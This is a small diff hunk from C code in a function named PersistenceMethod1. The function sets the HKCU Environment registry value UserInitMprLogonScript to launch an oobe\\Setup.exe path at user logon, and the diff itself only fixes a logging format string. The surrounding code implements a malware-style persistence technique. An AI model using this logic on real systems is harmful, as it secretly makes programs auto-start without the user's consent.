@@ -244,7 +244,7 @@ BOOL PersistenceMethod1
 	lstrcatW(wszSetupPath, L"\\oobe\\Setup.exe");
 	Status = RegSetKeyValueW(HKEY_CURRENT_USER, L"Environment", L"UserInitMprLogonScript", REG_SZ, wszSetupPath, (lstrlenW(wszSetupPath) + 1) * sizeof(WCHAR));
 	if (!NT_SUCCESS(Status)) {
-		LogError(L"RegSetKeyValueW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, Status);
+		LogError(L"RegSetKeyValueW failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, Status);
 		goto CLEANUP;
 	}
 
